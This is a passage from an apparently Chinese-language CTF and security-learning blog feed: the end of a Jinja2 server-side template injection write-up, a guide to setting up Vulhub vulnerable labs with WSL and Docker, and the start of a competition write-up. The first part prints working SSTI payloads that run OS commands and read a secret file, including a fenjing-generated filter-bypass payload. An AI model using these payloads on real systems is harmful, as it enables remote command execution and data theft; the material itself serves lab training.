class="code"><pre><code class="hljs python">&#123;&#123; lipsum.__globals__[<span class="hljs-string">&quot;os&quot;</span>].popen(<span class="hljs-string">&#x27;cat /var/secret_flag&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-09_14-05-46.png" alt="PixPin_2025-07-09_14-05-46"></p><h2 id="ä½¿ç”¨ç„šé–"><a href="#ä½¿ç”¨ç„šé–" class="headerlink" title="ä½¿ç”¨ç„šé–"></a>ä½¿ç”¨ç„šé–</h2><p>æŠŠæºä»£ç ä¸­é»‘åå•å†™å…¥waf.txtï¼Œåˆ é™¤<code>&#123; &#125;</code>ç”¨__WAFç»•å…³é”®å­—æ”»å‡»__çš„æ–¹æ³•è¯»å–å…³é”®å­—é»‘åå•å¹¶ç”Ÿæˆç»•è¿‡payloadã€‚</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m fenjing crack-keywords -k waf.txt -o output.txt --command &#x27;ls /&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m fenjing   #å¯åŠ¨crackåŠŸèƒ½<br>-k waf.txt        #é»‘åå•å…³é”®å­—æ–‡ä»¶ï¼ˆè¿˜å¯ä»¥æ˜¯.py/.jsonï¼‰<br>--command&#x27;ls /&#x27;     #æ˜¯ä½ æƒ³è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤<br>-o output.txt#æ˜¯è¾“å‡ºæ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>å¾—åˆ°çš„payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;(cycler.next[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;p&#x27;&#x27;open&#x27;](&#x27;ls /&#x27;))[&#x27;r&#x27;&#x27;ead&#x27;]()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æŠŠ<code>&#123;&#123;` ` &#125;&#125;</code>åˆ†åˆ«æ›¿æ¢ä¸ºkeywordså°±å¯ä»¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;å¤©å‘½(cycler.next[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&#x27;</span>o<span class="hljs-string">&#x27;&#x27;</span>s<span class="hljs-string">&#x27;][&#x27;</span>p<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in">open</span><span class="hljs-string">&#x27;](&#x27;</span>ls /<span class="hljs-string">&#x27;))[&#x27;</span><span class="hljs-string">r&#x27;&#x27;</span>ead<span class="hljs-string">&#x27;]()éš¾è¿&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>windows11ç³»ç»Ÿä¸‹æ­å»ºè·å– Vulhubé¶åœº</title>
    <link href="/2025/07/17/windows11%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%8E%B7%E5%8F%96-Vulhub%E9%9D%B6%E5%9C%BA/"/>
    <url>/2025/07/17/windows11%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%8E%B7%E5%8F%96-Vulhub%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="windows11ç³»ç»Ÿä¸‹æ­å»ºæ­å»ºè·å–-Vulhubé¶åœº"><a href="#windows11ç³»ç»Ÿä¸‹æ­å»ºæ­å»ºè·å–-Vulhubé¶åœº" class="headerlink" title="windows11ç³»ç»Ÿä¸‹æ­å»ºæ­å»ºè·å– Vulhubé¶åœº"></a>windows11ç³»ç»Ÿä¸‹æ­å»ºæ­å»ºè·å– Vulhubé¶åœº</h1><h2 id="å‰ææ¡ä»¶ï¼ˆè¯·ç¡®ä¿ä»¥ä¸‹éƒ½å·²å®‰è£…ï¼‰ï¼š"><a href="#å‰ææ¡ä»¶ï¼ˆè¯·ç¡®ä¿ä»¥ä¸‹éƒ½å·²å®‰è£…ï¼‰ï¼š" class="headerlink" title="å‰ææ¡ä»¶ï¼ˆè¯·ç¡®ä¿ä»¥ä¸‹éƒ½å·²å®‰è£…ï¼‰ï¼š"></a>å‰ææ¡ä»¶ï¼ˆè¯·ç¡®ä¿ä»¥ä¸‹éƒ½å·²å®‰è£…ï¼‰ï¼š</h2><ol><li><strong>Windows 11</strong></li><li><strong>Docker Desktop</strong><ul><li>å®˜ç½‘ä¸‹è½½ï¼š<a href="https://www.docker.com/products/docker-desktop/">https://www.docker.com/products/docker-desktop/</a></li><li>âš ï¸ å¦‚æœä½ çš„å…¬å¸ç¬¦åˆâ€œéœ€ä»˜è´¹â€çš„æ¡ä»¶ï¼Œè¯·å‚è€ƒè®¢é˜…åè®®ã€‚</li></ul></li><li><strong>Git</strong>ï¼ˆç”¨äºå…‹éš† Vulhubï¼‰<ul><li>å®˜ç½‘ä¸‹è½½ï¼š<a href="https://git-scm.com/">https://git-scm.com/</a></li></ul></li></ol><h2 id="å¯åŠ¨-Docker-Desktop"><a href="#å¯åŠ¨-Docker-Desktop" class="headerlink" title="å¯åŠ¨ Docker Desktop"></a>å¯åŠ¨ Docker Desktop</h2><ul><li>å®‰è£…åï¼Œå¯åŠ¨ Docker Desktopã€‚</li><li>è¿›å…¥è®¾ç½® â†’ <code>General</code>ï¼Œç¡®è®¤å·²å‹¾é€‰ **â€Use the WSL 2 based engineâ€**ã€‚</li></ul><h2 id="å®‰è£…ä¸€ä¸ª-Linux-å‘è¡Œç‰ˆï¼ˆæ¨è-Ubuntuï¼‰"><a href="#å®‰è£…ä¸€ä¸ª-Linux-å‘è¡Œç‰ˆï¼ˆæ¨è-Ubuntuï¼‰" class="headerlink" title="å®‰è£…ä¸€ä¸ª Linux å‘è¡Œç‰ˆï¼ˆæ¨è Ubuntuï¼‰"></a>å®‰è£…ä¸€ä¸ª Linux å‘è¡Œç‰ˆï¼ˆæ¨è Ubuntuï¼‰</h2><p>å®‰è£…ä¸€ä¸ª Linux å‘è¡Œç‰ˆï¼ˆæ¨è Ubuntuï¼‰ï¼Œç„¶åæ‰èƒ½è¿è¡Œ Vulhubã€‚</p><p>åœ¨ PowerShell ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wsl --list --online<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_10-06-00.png" alt="PixPin_2025-07-16_10-06-00"></p><p>ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£… Ubuntuï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wsl --install -d Ubuntu<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_10-06-15.png" alt="PixPin_2025-07-16_10-06-15"></p><p>ç­‰å¾…å‡ åˆ†é’Ÿï¼Œå®ƒä¼šè‡ªåŠ¨ä¸‹è½½å¹¶å®‰è£… Ubuntuã€‚</p><p>å®‰è£…å®Œæˆåä¼šå¼¹å‡ºä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæç¤ºä½ è®¾ç½®ç”¨æˆ·åå’Œå¯†ç ï¼ˆéšä¾¿è®¾ç½®ä¸€ä¸ªä½ è®°å¾—ä½çš„å³å¯ï¼‰ã€‚</p><h2 id="å¯ç”¨-Docker-Desktop-çš„-WSL-é›†æˆ"><a href="#å¯ç”¨-Docker-Desktop-çš„-WSL-é›†æˆ" class="headerlink" title="å¯ç”¨ Docker Desktop çš„ WSL é›†æˆ"></a>å¯ç”¨ Docker Desktop çš„ WSL é›†æˆ</h2><p><strong>æ­¥éª¤ 1ï¼šæ‰“å¼€ Docker Desktop è®¾ç½®</strong></p><p><strong>æ­¥éª¤ 2ï¼šå¯ç”¨ WSL é›†æˆ</strong></p><p>åœ¨è®¾ç½®ç•Œé¢ä¸­ä¾æ¬¡æ“ä½œï¼š</p><ul><li>ç‚¹å‡»å·¦ä¾§èœå•ä¸­çš„ï¼š<strong>Resources &gt; WSL Integration</strong></li><li>åœ¨å³ä¾§ä½ ä¼šçœ‹åˆ°ä¸€ä¸ª Linux å‘è¡Œç‰ˆåˆ—è¡¨ï¼ˆå¦‚ <code>Ubuntu</code>ï¼‰</li><li>âœ… <strong>å‹¾é€‰ä½ å®‰è£…çš„ Ubuntu</strong></li><li>ç¡®ä¿å³ä¸Šè§’ <strong>â€œEnable integration with my default WSL distroâ€</strong> ä¹Ÿè¢«å‹¾é€‰</li><li>ç‚¹å‡» <strong>â€œApply &amp; Restartâ€</strong></li></ul><blockquote><p>âš ï¸ è¿™ä¸€æ­¥éå¸¸å…³é”®ï¼Œå®ƒå…è®¸ä½ åœ¨ WSL å­ç³»ç»Ÿä¸­ä½¿ç”¨ Dockerã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_14-06-01.png" alt="PixPin_2025-07-16_14-06-01"></p><p>æ­¥éª¤ 3ï¼šé‡å¯ Ubuntu ç»ˆç«¯</p><p>å…³é—­å½“å‰çš„ Ubuntu ç»ˆç«¯ï¼Œé‡æ–°æ‰“å¼€å®ƒï¼Œç„¶åè¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker --version<br></code></pre></td></tr></table></figure><p>å¦‚æœè¾“å‡º Docker çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œè¯´æ˜ä¸€åˆ‡æ­£å¸¸ï¼Œä½ ç°åœ¨å¯ä»¥è¿è¡Œ Vulhub äº†ï¼</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_14-07-40.png" alt="PixPin_2025-07-16_14-07-40"></p><h2 id="å®‰è£…-docker-composeï¼ˆå¦‚æœè¿˜æ²¡è£…ï¼‰"><a href="#å®‰è£…-docker-composeï¼ˆå¦‚æœè¿˜æ²¡è£…ï¼‰" class="headerlink" title="å®‰è£… docker-composeï¼ˆå¦‚æœè¿˜æ²¡è£…ï¼‰"></a>å®‰è£… docker-composeï¼ˆå¦‚æœè¿˜æ²¡è£…ï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install -y docker-compose<br></code></pre></td></tr></table></figure><blockquote><p>æœ‰æ—¶æ–°ç‰ˆæœ¬çš„ Docker Desktop å·²ç»å†…ç½®äº† <code>docker compose</code> å‘½ä»¤ï¼ˆæ³¨æ„æ²¡æœ‰çŸ­æ¨ªçº¿ï¼‰ï¼Œä¹Ÿå¯ä»¥è¯•è¯•çœ‹ï¼š</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker compose version<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_14-08-11.png" alt="PixPin_2025-07-16_14-08-11"></p><h2 id="å…‹éš†-Vulhub-é¡¹ç›®"><a href="#å…‹éš†-Vulhub-é¡¹ç›®" class="headerlink" title="å…‹éš† Vulhub é¡¹ç›®"></a>å…‹éš† Vulhub é¡¹ç›®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æˆ‘è¿™é‡ŒæŠ¥é”™äº†</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_14-38-59.png" alt="PixPin_2025-07-16_14-38-59"></p><p>å› ä¸º <strong>ç½‘ç»œç¯å¢ƒå±è”½æˆ–å¹²æ‰°äº†å¯¹ <code>ghproxy.com</code> çš„è®¿é—®</strong>ã€‚è¿™æ˜¯åœ¨ä¸­å›½å¤§é™†åœ°åŒºè®¿é—® GitHub æˆ–ä»£ç†å¸¸è§çš„é—®é¢˜ã€‚</p><p> æœ€ç¨³å¦¥çš„è§£å†³æ–¹æ¡ˆï¼š<strong>ä¸‹è½½ Vulhub çš„ .zip æ–‡ä»¶ï¼Œæ‰‹åŠ¨å¯¼å…¥</strong></p><h3 id="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½-Vulhub-å‹ç¼©åŒ…"><a href="#ç¬¬ä¸€æ­¥ï¼šä¸‹è½½-Vulhub-å‹ç¼©åŒ…" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ Vulhub å‹ç¼©åŒ…"></a>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ Vulhub å‹ç¼©åŒ…</h3><p>è¯·ç”¨æµè§ˆå™¨æ‰“å¼€ä»¥ä¸‹é“¾æ¥ä¸‹è½½ Vulhubï¼ˆGitHub çš„æ‰“åŒ… <code>.zip</code> æ–‡ä»¶ï¼‰ï¼š</p><p>ğŸ”— <a href="https://github.com/vulhub/vulhub/archive/refs/heads/master.zip">https://github.com/vulhub/vulhub/archive/refs/heads/master.zip</a></p><p>ä¸‹è½½å®Œæˆåï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶åç±»ä¼¼ï¼š<code>master.zip</code></p><hr><h3 id="ç¬¬äºŒæ­¥ï¼šå°†-master-zip-æ‹·è´åˆ°-WSLï¼ˆUbuntuï¼‰ä¸­"><a href="#ç¬¬äºŒæ­¥ï¼šå°†-master-zip-æ‹·è´åˆ°-WSLï¼ˆUbuntuï¼‰ä¸­" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šå°† master.zip æ‹·è´åˆ° WSLï¼ˆUbuntuï¼‰ä¸­"></a>ç¬¬äºŒæ­¥ï¼šå°† <code>master.zip</code> æ‹·è´åˆ° WSLï¼ˆUbuntuï¼‰ä¸­</h3><ol><li>æŒ‰ä¸‹ <code>Win + R</code>ï¼Œè¾“å…¥ï¼š<code>\\wsl$\Ubuntu\home\seora</code> å›è½¦</li><li>å°†åˆšæ‰ä¸‹è½½çš„ <code>master.zip</code> æ‹–è¿›å»</li></ol><p>ä½ ç°åœ¨å·²ç»æŠŠæ–‡ä»¶æ”¾åˆ°äº† WSL Ubuntu çš„ <code>~/</code> ç›®å½•ä¸­ã€‚</p><hr><h3 id="ç¬¬ä¸‰æ­¥ï¼šè§£å‹å¹¶å¼€å§‹ä½¿ç”¨-Vulhub"><a href="#ç¬¬ä¸‰æ­¥ï¼šè§£å‹å¹¶å¼€å§‹ä½¿ç”¨-Vulhub" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šè§£å‹å¹¶å¼€å§‹ä½¿ç”¨ Vulhub"></a>ç¬¬ä¸‰æ­¥ï¼šè§£å‹å¹¶å¼€å§‹ä½¿ç”¨ Vulhub</h3><p>æ‰“å¼€ Ubuntu ç»ˆç«¯ï¼Œæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br>unzip master.zip<br><span class="hljs-built_in">mv</span> vulhub-master vulhub<br><span class="hljs-built_in">cd</span> vulhub<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_14-38-59-1752649574996-5.png" alt="PixPin_2025-07-16_14-38-59"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_15-04-44.png" alt="PixPin_2025-07-16_15-04-44"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_15-06-38.png" alt="PixPin_2025-07-16_15-06-38"></p><p>ä½ ç°åœ¨å°±åœ¨ Vulhub æ ¹ç›®å½•äº†</p><h2 id="è¿è¡Œä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼ˆç¤ºä¾‹ï¼šTomcat-æ¼æ´ï¼‰"><a href="#è¿è¡Œä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼ˆç¤ºä¾‹ï¼šTomcat-æ¼æ´ï¼‰" class="headerlink" title="è¿è¡Œä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼ˆç¤ºä¾‹ï¼šTomcat æ¼æ´ï¼‰"></a>è¿è¡Œä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼ˆç¤ºä¾‹ï¼šTomcat æ¼æ´ï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> tomcat/CVE-2017-12615<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p>ç­‰å¾…å‡ ç§’æˆ–å‡ åç§’ï¼Œç¯å¢ƒéƒ¨ç½²å®Œæˆï¼</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-16_21-00-22.png" alt="PixPin_2025-07-16_21-00-22"></p><p><strong>Docker æ— æ³•è¿æ¥åˆ° Docker Hub çš„æœåŠ¡å™¨</strong>ï¼Œæœ¬è´¨ä¸Šæ˜¯ <strong>ç½‘ç»œé—®é¢˜ï¼ˆè¢«å¢™ã€è¶…æ—¶ã€æ— ä»£ç†ï¼‰</strong>ï¼Œè¿™åœ¨å›½å†…å¾ˆå¸¸è§ã€‚</p><p>è§£å†³æ–¹æ³•ï¼š<a href="https://blog.csdn.net/ph12345687/article/details/141923393">ä¸‹è½½docker-composeå¹¶æ›´æ–°ï¼ˆå¯å›½å†…é•œåƒåœ¨çº¿å’Œç¦»çº¿ä¸‹è½½ï¼‰_docker-compose å›½å†…ä¸‹è½½-CSDNåšå®¢</a></p><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><h4 id="ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé…ç½®ç›®å½•ï¼ˆå¦‚æœæ²¡æœ‰ï¼‰"><a href="#ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé…ç½®ç›®å½•ï¼ˆå¦‚æœæ²¡æœ‰ï¼‰" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé…ç½®ç›®å½•ï¼ˆå¦‚æœæ²¡æœ‰ï¼‰"></a>ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé…ç½®ç›®å½•ï¼ˆå¦‚æœæ²¡æœ‰ï¼‰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/docker<br></code></pre></td></tr></table></figure><hr><h4 id="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæˆ–ä¿®æ”¹é•œåƒåŠ é€Ÿé…ç½®æ–‡ä»¶-daemon-json"><a href="#ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæˆ–ä¿®æ”¹é•œåƒåŠ é€Ÿé…ç½®æ–‡ä»¶-daemon-json" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæˆ–ä¿®æ”¹é•œåƒåŠ é€Ÿé…ç½®æ–‡ä»¶ daemon.json"></a>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæˆ–ä¿®æ”¹é•œåƒåŠ é€Ÿé…ç½®æ–‡ä»¶ <code>daemon.json</code></h4><p>å°†ä¸‹é¢å‘½ä»¤å¤åˆ¶ç²˜è´´åˆ°ä½ çš„ç»ˆç«¯ï¼Œå®ƒä¼šå†™å…¥åŠ é€Ÿå™¨åœ°å€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://docker.1ms.run&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p>ä½ å¯ä»¥æ›¿æ¢æˆå…¶ä»–åœ°å€ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span><br></code></pre></td></tr></table></figure><hr><h4 id="ç¬¬ä¸‰æ­¥ï¼šé‡å¯-Docker-æœåŠ¡"><a href="#ç¬¬ä¸‰æ­¥ï¼šé‡å¯-Docker-æœåŠ¡" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šé‡å¯ Docker æœåŠ¡"></a>ç¬¬ä¸‰æ­¥ï¼šé‡å¯ Docker æœåŠ¡</h4><p>âš ï¸ WSL ä¸­ä¸èƒ½ç”¨ <code>systemctl</code>ï¼Œç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æ¥é‡å¯ Dockerï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wsl.exe --shutdown<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <strong>Windows ä¸­é‡æ–°æ‰“å¼€ Docker Desktop</strong>ï¼Œæˆ–ç›´æ¥é‡å¯ç”µè„‘ä¹Ÿå¯ä»¥ã€‚</p><hr><h4 id="ç¬¬å››æ­¥ï¼šéªŒè¯æ˜¯å¦æˆåŠŸï¼ˆé€‰åšï¼‰"><a href="#ç¬¬å››æ­¥ï¼šéªŒè¯æ˜¯å¦æˆåŠŸï¼ˆé€‰åšï¼‰" class="headerlink" title="ç¬¬å››æ­¥ï¼šéªŒè¯æ˜¯å¦æˆåŠŸï¼ˆé€‰åšï¼‰"></a>ç¬¬å››æ­¥ï¼šéªŒè¯æ˜¯å¦æˆåŠŸï¼ˆé€‰åšï¼‰</h4><p>ä½ å¯ä»¥è¯•ç€æ‹‰ä¸ªé•œåƒçœ‹çœ‹é€Ÿåº¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull docker.1ms.run/library/mysql<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æˆ‘ä½¿ç”¨äº†æ–¹æ³•ä¸€è¿˜æ˜¯æ²¡è¡Œã€‚</p><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>æˆ‘æåˆ°è¿™é‡Œå‘ç°ç»ˆç«¯ä¸€ç›´æœ‰æç¤º<code>wsl: æ£€æµ‹åˆ° localhost ä»£ç†é…ç½®ï¼Œä½†æœªé•œåƒåˆ° WSLã€‚NAT æ¨¡å¼ä¸‹çš„ WSL ä¸æ”¯æŒ localhost ä»£ç†ã€‚ è¿™æ˜¯ä»€ä¹ˆæ„æ€</code></p><p>ä¸çŸ¥é“ä¹‹å‰ä¸€ç›´ä¸æˆåŠŸä¼šä¸ä¼šè·Ÿè¿™ä¸ªæœ‰å…³ï¼Œè§£å†³äº†ä¸€ä¸‹ç„¶åå°è¯•ä¸‹é¢çš„å°±å¯ä»¥æ­£å¸¸è¿è¡Œæ¼æ´ç¯å¢ƒäº†ã€‚</p><h4 id="å…ˆæ‰‹åŠ¨æ‹‰å–é•œåƒä»¥é¿å…-compose-æŠ¥é”™"><a href="#å…ˆæ‰‹åŠ¨æ‹‰å–é•œåƒä»¥é¿å…-compose-æŠ¥é”™" class="headerlink" title="å…ˆæ‰‹åŠ¨æ‹‰å–é•œåƒä»¥é¿å… compose æŠ¥é”™"></a><strong>å…ˆæ‰‹åŠ¨æ‹‰å–é•œåƒä»¥é¿å… compose æŠ¥é”™</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull vulhub/tomcat:8.5.19<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_15-13-22.png" alt="PixPin_2025-07-17_15-13-22"></p><p>ç„¶å</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_15-13-34.png" alt="PixPin_2025-07-17_15-13-34"></p><h2 id="è®¿é—®æ¼æ´æœåŠ¡"><a href="#è®¿é—®æ¼æ´æœåŠ¡" class="headerlink" title="è®¿é—®æ¼æ´æœåŠ¡"></a>è®¿é—®æ¼æ´æœåŠ¡</h2><p>æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">http:<span class="hljs-comment">//localhost:8080</span><br></code></pre></td></tr></table></figure><p>ä½ åº”è¯¥èƒ½çœ‹åˆ° Tomcat çš„æ¬¢è¿é¡µé¢ï¼Œè¯´æ˜æ¼æ´ç¯å¢ƒå·²éƒ¨ç½²æˆåŠŸ ğŸ‰ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_15-20-37.png" alt="PixPin_2025-07-17_15-20-37"></p><h3 id="è¡¥å……è¯´æ˜"><a href="#è¡¥å……è¯´æ˜" class="headerlink" title="è¡¥å……è¯´æ˜"></a>è¡¥å……è¯´æ˜</h3><ul><li><p>è¦å…³é—­ç¯å¢ƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose down<br></code></pre></td></tr></table></figure></li></ul><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_15-26-14.png" alt="PixPin_2025-07-17_15-26-14"></p><ul><li><p>è¦æŸ¥çœ‹æ‰€æœ‰è¿è¡Œä¸­çš„ç¯å¢ƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2025å¾¡ç½‘æ¯çº¿ä¸‹èµ›</title>
    <link href="/2025/07/15/2025%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    <url>/2025/07/15/2025%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="å¾¡ç½‘æ¯20205çº¿ä¸‹åŠå†³èµ›"><a href="#å¾¡ç½‘æ¯20205çº¿ä¸‹åŠå†³èµ›" class="headerlink" title="å¾¡ç½‘æ¯20205çº¿ä¸‹åŠå†³èµ›"></a>å¾¡ç½‘æ¯20205çº¿ä¸‹åŠå†³èµ›</h1><h2 id="reæ–¹å‘"><a href="#reæ–¹å‘" class="headerlink" title="reæ–¹å‘"></a>reæ–¹å‘</h2><h3 id="re-c"><a href="#re-c" class="headerlink" title="re_c"></a>re_c</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215154464.png" alt="image-20250714215154464"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215137704.png" alt="image-20250714215137704"></p><p>FLAG:flag{HNCTFmng1}</p><h3 id="re-python"><a href="#re-python" class="headerlink" title="re_python"></a>re_python</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215539018.png" alt="image-20250714215539018"></p><p>å¾—åˆ°</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215708927.png" alt="image-20250714215708927"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20250714215645961.png" alt="image-20250714215645961"></p><p>è„šæœ¬</p><figure class="highlight 